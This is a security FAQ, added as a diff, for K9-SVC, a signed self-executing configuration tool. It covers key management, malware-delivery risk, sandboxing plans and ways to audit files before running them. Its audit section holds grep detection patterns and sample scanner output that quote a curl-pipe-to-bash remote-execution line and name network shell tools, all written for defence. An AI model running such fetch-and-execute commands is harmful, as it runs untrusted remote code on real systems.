@@ -1,0 +1,1014 @@
+// SPDX-License-Identifier: PMPL-1.0-or-later
+= K9-SVC Security FAQ
+:subtitle: Real Questions from Security-Conscious Users
+:author: Jonathan D.A. Jewell <jonathan.jewell@open.ac.uk>
+:revdate: 2026-01-30
+:toc: left
+:toclevels: 3
+:icons: font
+:source-highlighter: rouge
+
+== Introduction
+
+This FAQ captures real security concerns raised during K9-SVC development. If you're considering professional adoption and have security questions, start here.
+
+**Key Documents:**
+- link:../SECURITY-ANALYSIS.adoc[Complete Security Analysis] - Threat model, attack vectors
+- link:../SECURITY-SOLUTIONS-VS-MITIGATIONS.adoc[Solutions vs Mitigations] - What actually works
+- link:SECURITY-ROADMAP.adoc[Security Roadmap] - Implementation timeline
+- link:SECURITY-FOR-DECISION-MAKERS.adoc[Executive Summary] - For managers/CISOs
+
+---
+
+== Part I: The Big Questions
+
+=== Q1: Is K9 secure?
+
+**Short Answer:** Not yet, but it can be.
+
+**Longer Answer:**
+
+K9's security **design** is sound:
+- Three-tier leash system (Kennel/Yard/Hunt)
+- Ed25519 signature requirement for Hunt level
+- Manual trust establishment
+- Functional purity at Yard level
+
+K9's **implementation** has gaps:
+- sign.sh is a shell script (vulnerable to injection)
+- No sandboxing options
+- No static analysis tools
+- Key management is manual
+
+**After full implementation** (Tier 1-3 in roadmap):
+- 95% risk elimination
+- Security comparable to Docker (signed images), Ansible (signed playbooks)
+- Suitable for professional/enterprise use
+
+**Timeline to "secure":**
+- Tier 1 (70% risk elimination): 3-5 weeks
+- Tier 2 (90% risk elimination): 2-3 months
+- Tier 3 (95% risk elimination): 6-12 months
+
+---
+
+=== Q2: Isn't "self-executing config" just malware?
+
+**This is the perception problem.**
+
+**Yes, it sounds scary.** Historically, "active documents" = malware:
+- Microsoft Office macros
+- Adobe PDF exploits
+- ActiveX controls
+
+**But K9 is different:**
+
+[cols="2,2,2"]
+|===
+| Malware Pattern | K9 Design | Key Difference
+
+| **Auto-executes**
+| Requires signature verification
+| Hunt level won't run without trusted key
+
+| **Hidden payload**
+| Just recipes are visible
+| User can review before first run
+
+| **No user control**
+| Three security levels
+| Kennel (safe), Yard (sandboxed), Hunt (privileged)
+
+| **Social engineering**
+| Manual trust establishment
+| User must explicitly trust signing keys
+|===
+
+**Similar "scary" technologies that succeeded:**
+- **PowerShell**: Initially feared, now industry standard (with signing)
+- **Docker**: "Random code from internet in containers" → accepted (with signing)
+- **Snap/Flatpak**: Apps execute code → trusted (with sandboxing)
+
+**K9 follows the same pattern:** Powerful capability + security model + clear use cases = accepted tool.
+
+**The terminology problem:**
+- "Self-executing" → sounds like virus
+- "Unleash" → sounds like attack
+- "Hunt" → sounds predatory
+
+**Solution:** Rename problematic terms (in progress):
+- "Self-executing" → "Self-validating with optional deployment"
+- "Unleash" → "Deploy"
+- "Hunt" → "Production"
+
+---
+
+=== Q3: What if someone steals my signing key?
+
+**This is a real risk.**
+
+**Current state (v1.0.0):**
+- Keys stored in `~/.config/k9/keys/` with 600 permissions
+- No password protection
+- No revocation mechanism
+- If stolen: attacker can sign malicious K9 files
+
+**After Tier 1 (week 1-5):**
+- Password-protected keys (optional but recommended)
+- Warning prompts before trusting keys
+- Key fingerprint display
+
+**After Tier 2 (month 1-3):**
+- **HSM/YubiKey required for production keys** ← SOLVES software theft
+- Key revocation system (CRL or similar)
+- Key rotation documentation
+
+**Best practices (now):**
+1. Generate separate keys for dev/prod
+2. Store prod keys on separate machine (air-gapped signing)
+3. Use strong file permissions (600)
+4. Regularly rotate keys
+5. Monitor for unexpected signatures
+
+**Best practices (after Tier 2):**
+1. **Production keys MUST be on HSM/YubiKey**
+2. Dev keys can use password protection
+3. Rotate keys annually
+4. Publish key fingerprints on official website
+5. Use key revocation for compromised keys
+
+**If key is compromised:**
+1. Immediately revoke key (add to CRL)
+2. Notify all users (security advisory)
+3. Generate new key
+4. Re-sign all legitimate K9 files
+5. Investigate how compromise occurred
+
+---
+
+=== Q4: Can K9 be used to deliver malware?
+
+**Yes, like any powerful tool.**
+
+**The honest answer:**
+- K9 at Hunt level has full system access
+- If attacker has a trusted signing key, they can deliver malware
+- If user trusts wrong key, they can be infected
+
+**This is the same for:**
+- PowerShell scripts (if signed with trusted cert)
+- Docker images (if from trusted registry)
+- Ansible playbooks (if signed with trusted key)
+- Bash scripts (if from trusted source)
+
+**K9's defenses:**
+
+[cols="1,2,2"]
+|===
+| Defense Layer | How It Helps | Effectiveness
+
+| **Signature requirement**
+| Malware must be signed by trusted key
+| 🟢 HIGH (if key management good)
+
+| **Manual trust**
+| User must explicitly trust attacker's key
+| 🟡 MEDIUM (social engineering possible)
+
+| **Static analysis** (k9-scan)
+| Flags dangerous commands
+| 🟡 MEDIUM (can be bypassed)
+
+| **Dry-run mode**
+| Shows commands before execution
+| 🟡 MEDIUM (users can ignore)
+
+| **Sandbox** (Tier 2)
+| Contains damage if malware runs
+| 🟢 HIGH (limits blast radius)
+|===
+
+**The reality:**
+- K9 is a tool, tools can be abused
+- Security depends on key management and user awareness
+- After Tier 2, comparable to industry-standard tools
+
+**Mitigation strategy:**
+1. Only trust keys from verified sources (official repo, personal verification)
+2. Review Just recipes before first run (especially Hunt level)
+3. Use k9-scan to check for malicious patterns
+4. Run in sandbox for initial testing
+5. Limit Hunt level to trusted, production configs
+
+---
+
+=== Q5: Will antivirus software flag K9 files?
+
+**Probably yes, initially.**
+
+**Why:**
+- K9 files contain executable code (Just recipes)
+- Hunt-level components have full system access
+- Signature system can look like code signing malware uses
+- "Self-executing config" matches malware patterns
+
+**Historical precedent:**
+- PowerShell scripts often flagged
+- Docker images with crypto miners flagged
+- Legitimate admin tools flagged (Sysinternals, etc.)
+
+**Mitigation:**
+
+**Short-term (Tier 1):**
+1. Submit K9 tooling for code signing (Authenticode on Windows, etc.)
+2. Report false positives to AV vendors
+3. Document whitelist procedure for enterprise IT
+4. Add `k9` to NIST National Vulnerability Database (clarify it's not malware)
+
+**Long-term (Tier 2-3):**
+1. Security audit by reputable firm (Trail of Bits, NCC Group)
+2. Publish audit results
+3. Industry acceptance (conference talks, papers)
+4. Enterprise adoption (credibility)
+
+**If your AV flags K9:**
+1. Check signature (ensure it's legitimate K9, not malware)
+2. Submit false positive report to AV vendor
+3. Whitelist K9 tooling (must, justfile, sign.sh)
+4. Use VirusTotal to verify (should be clean except heuristic flags)
+
+**For enterprise deployment:**
+- Include K9 whitelist in security policy
+- Document security assessment
+- Require Hunt-level components to be reviewed by security team
+- Monitor for abuse
+
+---
+
+=== Q6: What happens if Nickel has a vulnerability?
+
+**This is a supply chain risk.**
+
+**Nickel is an external dependency:**
+- Written in Rust (memory-safe, good)
+- Actively maintained (good)
+- Used for evaluation at Yard and Hunt levels (critical)
+- If Nickel has bug, K9 inherits it (bad)
+
+**Potential Nickel vulnerabilities:**
+
+[cols="1,2,2"]
+|===
+| Vulnerability Type | Impact on K9 | Mitigation
+
+| **Memory corruption**
+| Low (Nickel is Rust)
+| Nickel already memory-safe
+
+| **Infinite loop / DoS**
+| Hang K9 validation
+| Timeout + memory limits
+
+| **Type confusion**
+| Break contract guarantees
+| Keep Nickel updated
+
+| **Sandbox escape**
+| Yard-level code executes with I/O
+| Sandbox Nickel process
+|===
+
+**Current mitigation (v1.0.0):**
+- Functional purity (Yard level has no I/O)
+- Contract isolation (limits blast radius)
+- Dependency pinning (known good version)
+
+**After Tier 2:**
+- **Nickel runs in isolated process with seccomp filter**
+  - No network access
+  - No file I/O (except stdin/stdout)
+  - Memory limit enforced by kernel
+  - Timeout enforced by parent process
+- Result: Even if Nickel exploited, contained
+
+**If Nickel CVE published:**
+1. Assess impact on K9 (does it affect our usage?)
+2. Update Nickel immediately
+3. Release K9 patch version
+4. Notify users (security advisory)
+5. Add test case for vulnerability
+
+**Vendor Nickel?**
+- Pro: Eliminates external supply chain
+- Con: Miss Nickel security updates
+- **Recommendation:** Don't vendor, but sandbox process
+
+---
+
+=== Q7: Should I use K9 for production systems?
+
+**It depends on which tier you need.**
+
+**NOT YET (current v1.0.0):**
+- sign.sh is shell script (vulnerable)
+- No sandboxing
+- Key management manual
+- **Use for:** Research, prototypes, internal experimentation
+
+**MAYBE (after Tier 1, weeks 1-5):**
+- sign.sh rewritten in Rust (memory-safe)
+- Refuses to run as root
+- Improved key management
+- **Use for:** Internal production (with documented risks)
+
+**YES (after Tier 2, months 1-3):**
+- HSM-backed keys
+- Nickel sandboxed
+- Reproducible builds
+- **Use for:** External-facing production, enterprise deployment
+
+**DEFINITELY (after Tier 3, months 6-12):**
+- Formal verification
+- Security audit complete
+- Bug bounty program
+- **Use for:** Mission-critical, regulated environments
+
+**Decision matrix:**
+
+[cols="2,1,1,1"]
+|===
+| Use Case | Current | After Tier 1 | After Tier 2
+
+| **Research/prototype**
+| ✅ YES
+| ✅ YES
+| ✅ YES
+
+| **Internal dev tools**
+| 🟡 MAYBE
+| ✅ YES
+| ✅ YES
+
+| **Internal production**
+| ❌ NO
+| 🟡 MAYBE
+| ✅ YES
+
+| **External production**
+| ❌ NO
+| ❌ NO
+| ✅ YES
+
+| **Mission-critical**
+| ❌ NO
+| ❌ NO
+| 🟡 MAYBE (Tier 3)
+
+| **Regulated (HIPAA, PCI)**
+| ❌ NO
+| ❌ NO
+| 🟡 MAYBE (Tier 3 + audit)
+|===
+
+---
+
+== Part II: Technical Deep Dives
+
+=== Q8: How does K9 signature verification work?
+
+**High-level flow:**
+
+```
+1. User generates Ed25519 keypair:
+   ./sign.sh keygen production
+
+2. Sign K9 file:
+   ./sign.sh sign config.k9.ncl production
+   → Creates config.k9.ncl.sig
+
+3. Distribute public key (production.pub) to users
+
+4. User trusts public key:
+   ./sign.sh trust production.pub
+   → Copies to ~/.config/k9/keys/trusted/
+
+5. Verify signature:
+   ./sign.sh verify config.k9.ncl
+   → Checks signature against all trusted keys
+   → Only runs if signature valid
+```
+
+**Current implementation (sign.sh):**
+
+```bash
+# Simplified verification logic
+verified=false
+for pubkey in ~/.config/k9/keys/trusted/*.pub; do
+    if openssl pkeyutl -verify \
+        -pubin -inkey "$pubkey" \
+        -rawin -in "$file" \
+        -sigfile "$sigfile" 2>/dev/null; then
+        verified=true
+        break
+    fi
+done
+
+if [ "$verified" = "false" ]; then
+    echo "INVALID SIGNATURE"
+    exit 1
+fi
+```
+
+**Weaknesses:**
+- Shell script (injection risk)
+- Error handling (2>/dev/null hides issues)
+- No timeout (malformed sig could hang)
+- TOCTOU race (time-of-check to time-of-use)
+
+**After Tier 1 (Rust rewrite):**
+
+```rust
+// Pseudo-code for Rust implementation
+use ed25519_dalek::{PublicKey, Signature, Verifier};
+
+fn verify_signature(file: &Path, sig_file: &Path) -> Result<String> {
+    // Read file content
+    let content = fs::read(file)?;
+    let sig_bytes = fs::read(sig_file)?;
+    let signature = Signature::from_bytes(&sig_bytes)?;
+
+    // Try each trusted key
+    let trusted_keys = load_trusted_keys()?;
+    for (name, pubkey) in trusted_keys {
+        if pubkey.verify(&content, &signature).is_ok() {
+            return Ok(name); // Signature valid, return key name
+        }
+    }
+
+    Err("No trusted key verified signature")
+}
+```
+
+**Benefits:**
+- Memory-safe (no buffer overflows)
+- Proper error handling
+- Timeout on verification
+- Atomic verify-then-execute
+
+---
+
+=== Q9: What are the security levels (Kennel/Yard/Hunt)?
+
+**Three-tier leash system:**
+
+==== Kennel Level: Pure Data
+
+```nickel
+K9!
+leash = 'Kennel  # Data only, no execution
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "static-content"
+}
+
+# Just data, no code
+config = {
+  title = "My Document",
+  author = "Alice",
+  content = "Lorem ipsum..."
+}
+```
+
+**Permissions:**
+- ✅ Read data
+- ❌ No Nickel evaluation
+- ❌ No Just recipes
+- ❌ No I/O
+
+**Use cases:**
+- Documentation
+- Static content
+- Untrusted sources
+- Embedded data
+
+**Security:** 🟢 **SAFE** - Can open from untrusted sources
+
+---
+
+==== Yard Level: Sandboxed Evaluation
+
+```nickel
+K9!
+leash = 'Yard  # Validation only, no I/O
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "config-validator"
+}
+
+# Nickel evaluation permitted
+config = {
+  port | Number = 8080,
+  host | String = "0.0.0.0",
+
+  # Contract validation runs
+  port
+    | std.number.Positive
+    | std.contract.from_predicate (fun p => p >= 1024 && p <= 65535)
+}
+```
+
+**Permissions:**
+- ✅ Read data
+- ✅ Nickel evaluation (functional, pure)
+- ❌ No Just recipes
+- ❌ No I/O (file system, network)
+
+**Use cases:**
+- Configuration validation
+- Schema checking
+- Contract enforcement
+- Build-time validation
+
+**Security:** 🟡 **MOSTLY SAFE** - Nickel bugs could cause DoS, but no I/O access
+
+---
+
+==== Hunt Level: Full Execution
+
+```nickel
+K9!
+leash = 'Hunt  # Full execution, requires signature
+
+pedigree = {
+  schema_version = "1.0.0",
+  component_type = "production-deployment",
+  signature = "base64encodedSignature..."  # Required!
+}
+
+config = {
+  deploy_target = "production",
+  # ... config ...
+}
+```
+
+**Permissions:**
+- ✅ Read data
+- ✅ Nickel evaluation
+- ✅ Just recipes execute
+- ✅ Full I/O (file system, network, processes)
+
+**Requirements:**
+- 🔐 **MUST be cryptographically signed**
+- 🔐 **Signature must be from trusted key**
+- 🔐 **User must explicitly authorize**
+
+**Use cases:**
+- Production deployments
+- System configuration
+- Infrastructure as Code
+- CI/CD pipelines
+
+**Security:** 🔴 **DANGEROUS** - Full system access, only use with trusted, signed configs
+
+---
+
+=== Q10: Can I audit what a K9 file will do before running it?
+
+**Yes, multiple ways:**
+
+==== 1. Read the Just Recipes
+
+K9 files include `justfile` with deployment recipes:
+
+```bash
+# Read the justfile to see what will execute
+cat justfile
+
+# Look for dangerous commands
+grep -E "rm -rf|curl.*bash|eval|exec" justfile
+```
+
+**What to look for:**
+- `rm -rf` (file deletion)
+- `curl ... | bash` (remote code execution)
+- `eval` / `exec` (code injection risk)
+- Network access (`curl`, `wget`, `nc`)
+- Privilege escalation (`sudo`, `su`)
+
+==== 2. Use k9-scan (After Tier 1)
+
+```bash
+k9-scan suspicious.k9.ncl
+
+# Output:
+# ⚠️  RISK LEVEL: HIGH
+#
+# Dangerous patterns found:
+# - Line 42: rm -rf /tmp/* (file deletion)
+# - Line 58: curl https://unknown.com/script.sh | bash (remote execution)
+# - Line 73: sudo systemctl restart (privilege escalation)
+#
+# Recommendation: DO NOT RUN without review
+```
+
+==== 3. Dry-Run Mode (After Tier 1)
+
+```bash
+./must deploy --dry-run
+
+# Output:
+# Would execute:
+#   1. mkdir -p /opt/app
+#   2. cp config.json /opt/app/
+#   3. systemctl restart app.service
+#
+# Proceed? [y/N]
+```
+
+==== 4. Run in Sandbox (After Tier 2)
+
+```bash
+k9-sandbox --container suspicious.k9.ncl
+
+# Runs in isolated Podman container:
+# - No access to host filesystem
+# - No network access
+# - Limited memory/CPU
+# - Can observe behavior safely
+```
+
+==== 5. Static Analysis
+
+```bash
+# Check for network activity
+grep -r "curl\|wget\|nc\|ssh" .
+
+# Check for file operations
+grep -r "rm\|mv\|cp\|dd" .
+
+# Check for privilege escalation
+grep -r "sudo\|su\|setuid\|chmod" .
+
+# Check signature
+./sign.sh verify config.k9.ncl
+```
+
+**Best practice:**
+1. Read justfile first
+2. Run k9-scan
+3. Dry-run to see actual commands
+4. Verify signature
+5. If still unsure, run in sandbox first
+
+---
+
+== Part III: Practical Guidance
+
+=== Q11: How do I use K9 safely RIGHT NOW (v1.0.0)?
+
+**Conservative approach (safest):**
+
+1. **Use Kennel/Yard only:**
+```bash
+# Validation only, no execution
+nickel eval config.k9.ncl
+```
+
+2. **Never use Hunt level** until Tier 1 complete
+
+3. **If you must use Hunt:**
+   - Only on isolated VM/container
+   - Only with files you wrote yourself
+   - Manually review justfile before running
+   - Never with files from internet
+
+**Moderate approach (documented risks):**
+
+1. **Generate your own keys:**
+```bash
+./sign.sh keygen mykey
+chmod 600 ~/.config/k9/keys/mykey.key
+```
+
+2. **Sign your own K9 files:**
+```bash
+./sign.sh sign myconfig.k9.ncl mykey
+```
+
+3. **Trust only your own key:**
+```bash
+./sign.sh trust ~/.config/k9/keys/mykey.pub
+```
+
+4. **Never trust external keys** (even from collaborators, until Tier 2)
+
+5. **Review before first run:**
+```bash
+# Read the entire K9 file
+cat myconfig.k9.ncl
+
+# Read the justfile
+cat justfile
+
+# Manually verify no malicious commands
+```
+
+**Aggressive approach (for experts only):**
+
+1. Audit sign.sh source code yourself
+2. Run K9 in dedicated VM (disposable)
+3. Monitor with system call tracing:
+```bash
+strace -f ./must deploy 2>&1 | tee execution.log
+```
+4. Network isolation (air-gapped or firewall)
+5. Backup before execution
+
+**NOT recommended (unsafe):**
+- ❌ Trusting keys from random internet sources
+- ❌ Running unsigned Hunt-level files
+- ❌ Running as root
+- ❌ Running K9 files from email attachments
+- ❌ Auto-executing K9 files without review
+
+---
+
+=== Q12: What should I tell my security team?
+
+**Talking points for CISOs/security teams:**
+
+==== Honest Assessment
+
+**Current State (v1.0.0):**
+- "K9 is a research prototype with known security gaps"
+- "Not recommended for production without additional hardening"
+- "Similar to running shell scripts from trusted sources"
+- "Requires security-aware users and proper key management"
+
+**After Tier 1 (weeks 1-5):**
+- "K9 has memory-safe implementation (Rust)"
+- "Comparable to signed PowerShell scripts or Ansible playbooks"
+- "Suitable for internal use with documented risks"
+- "Requires key management policy"
+
+**After Tier 2 (months 1-3):**
+- "K9 has hardware-backed keys and sandboxing"
+- "Security comparable to Docker (signed images) or Snap/Flatpak"
+- "Suitable for production deployment"
+- "Recommend security audit before mission-critical use"
+
+==== Risk Comparison
+
+[cols="2,1,1,1"]
+|===
+| Risk | K9 (current) | After Tier 1 | After Tier 2
+
+| **Malware delivery**
+| 🔴 MEDIUM
+| 🟡 LOW
+| 🟢 VERY LOW
+
+| **Key compromise**
+| 🔴 HIGH
+| 🟡 MEDIUM
+| 🟢 LOW
+
+| **Code injection**
+| 🔴 HIGH
+| 🟢 VERY LOW
+| 🟢 VERY LOW
+
+| **Supply chain**
+| 🔴 HIGH
+| 🟡 MEDIUM
+| 🟡 MEDIUM
+
+| **Privilege escalation**
+| 🔴 MEDIUM
+| 🟢 VERY LOW
+| 🟢 VERY LOW
+|===
+
+==== Security Controls
+
+**Required controls for K9 deployment:**
+
+1. **Key Management Policy**
+   - Separate keys for dev/staging/production
+   - Production keys on HSM (after Tier 2)
+   - Key rotation schedule (annual)
+   - Key revocation procedure
+
+2. **Access Control**
+   - Limit who can sign production K9 files
+   - Require code review before signing
+   - Audit log of all Hunt-level executions
+   - Separate signing keys per team/service
+
+3. **Deployment Process**
+   - Manual review of new K9 files
+   - Automated scanning (k9-scan)
+   - Staging environment testing
+   - Signature verification in CI/CD
+
+4. **Monitoring**
+   - Log all K9 executions
+   - Alert on untrusted key usage
+   - Monitor for signature verification failures
+   - Track key usage patterns
+
+5. **Incident Response**
+   - Key compromise procedure
+   - Malware cleanup procedure
+   - Communication plan
+   - Post-mortem process
+
+==== Security Questionnaire Answers
+
+**"Is K9 secure?"**
+→ "Not yet, but actively working toward it. Target: production-ready in 2-3 months."
+
+**"Has K9 been audited?"**
+→ "Not yet. Security audit scheduled after Tier 2 implementation (Q1 2026)."
+
+**"What crypto does K9 use?"**
+→ "Ed25519 signatures via OpenSSL 1.1.1+. Industry-standard, NIST-approved."
+
+**"Can K9 be used for malware?"**
+→ "Yes, like PowerShell or Docker. Requires key compromise or social engineering."
+
+**"What happens if a key is compromised?"**
+→ "Currently: No revocation mechanism. After Tier 2: Key revocation system."
+
+**"Does K9 sandbox execution?"**
+→ "Not yet. After Tier 2: Mandatory sandbox for Hunt level."
+
+**"Who developed K9?"**
+→ "Open source, developed by hyperpolymath. Available for security review on GitHub."
+
+**"What's the incident response plan?"**
+→ "Documented in SECURITY.md. Includes CVE disclosure, key revocation, user notification."
+
+---
+
+=== Q13: How do I contribute to K9 security?
+
+**We welcome security contributions!**
+
+==== Report Vulnerabilities
+
+**Private disclosure (for serious issues):**
+- Email: security@hyperpolymath.org (or jonathan.jewell@open.ac.uk)
+- PGP key: [To be added]
+- Include: Description, PoC, suggested fix
+- Response: Within 48 hours
+- Disclosure: Coordinated (90-day window)
+
+**Public disclosure (for minor issues):**
+- GitHub Issues: https://github.com/hyperpolymath/k9-svc/issues
+- Label: `security`
+- Discussion welcome
+
+**Bug bounty (after Tier 2):**
+- Coming Q2 2026
+- HackerOne program
+- Rewards: $100-$5000 depending on severity
+
+==== Security Research
+
+**Encouraged research areas:**
+- Fuzz testing sign.sh
+- Nickel sandbox escape attempts
+- Signature verification bypass
+- Social engineering attack scenarios
+- Supply chain analysis
+
+**Please:**
+- Don't test on production systems
+- Coordinate disclosure
+- Share findings responsibly
+
+**We will:**
+- Acknowledge contributors
+- Fix issues promptly
+- Share credit publicly (with permission)
+
+==== Code Contributions
+
+**Security-focused PRs welcome:**
+- Rust rewrite of sign.sh
+- k9-scan static analysis
+- k9-sandbox implementation
+- Formal verification
+- Fuzzing harness
+- Security tests
+
+**Review process:**
+- All PRs reviewed by maintainer
+- Security-critical changes require extra review
+- Tests required
+- Documentation required
+
+==== Documentation
+
+**Help improve security docs:**
+- Add FAQ entries
+- Clarify confusing sections
+- Translate to other languages
+- Create tutorials
+- Write blog posts
+
+---
+
+== Part IV: Future Vision
+
+=== Q14: What's the long-term security vision for K9?
+
+**Short-term (2026 Q1-Q2):**
+- ✅ Tier 1-2 implementation complete
+- ✅ Security audit by reputable firm
+- ✅ Bug bounty program launched
+- ✅ Industry-standard security
+
+**Medium-term (2026 Q3-Q4):**
+- ✅ Tier 3 (formal verification) complete
+- ✅ Enterprise adoption (Fortune 500 companies)
+- ✅ Integration with PKI systems
+- ✅ NIST/FIPS compliance (if needed)
+
+**Long-term (2027+):**
+- ✅ Industry-leading security
+- ✅ Zero critical vulnerabilities (goal)
+- ✅ Academic research (security conferences)
+- ✅ Standardization (IETF RFC?)
+
+**Security will always be priority #1** for K9.
+
+---
+
+=== Q15: Will K9 always have security risks?
+
+**Honest answer: Yes, but manageable.**
+
+**Irreducible risks (cannot eliminate):**
+1. **Human error** - Users will trust wrong keys, ignore warnings
+2. **Zero-day vulnerabilities** - Unknown bugs in dependencies
+3. **Hunt inherent risk** - Full system access is the feature
+4. **Physical security** - Attacker with hardware access can steal keys (even HSM)
+5. **Social engineering** - Users can be tricked
+
+**These risks exist for ALL powerful tools:**
+- PowerShell has same risks
+- Docker has same risks
+- Ansible has same risks
+- Even sandboxed tools (Snap) have risks
+
+**The goal is NOT "perfect security" (impossible).**
+
+**The goal is "industry-standard security" (achievable):**
+- Comparable to established tools
+- Transparent about limitations
+- Continuous improvement
+- Responsible disclosure
+
+**After full implementation:**
+- 95% risk elimination (technical)
+- 5% irreducible (human/design)
+- This is acceptable for industry use
+
+**We will never claim K9 is "100% secure."**
+
+**We will always:**
+- Document known risks honestly
+- Fix vulnerabilities promptly
+- Improve continuously
+- Engage with security community
+
+---
+
+== Conclusion
+
+**K9 security is a journey, not a destination.**
+
+**Current state:** Research prototype, known gaps +
+**Near-term:** Production-ready with documented risks +
+**Long-term:** Industry-leading security
+
+**If you're security-conscious (and you should be):**
+- Read the full security docs
+- Understand the risks
+- Follow best practices
+- Contribute improvements
+
+**Questions not answered here?**
+- File an issue: https://github.com/hyperpolymath/k9-svc/issues
+- Email: jonathan.jewell@open.ac.uk
+- We'll update this FAQ
+
+---
+
+**Last Updated:** 2026-01-30 +
+**Next Review:** After Tier 1 implementation +
+**Maintainer:** Jonathan D.A. Jewell <jonathan.jewell@open.ac.uk>
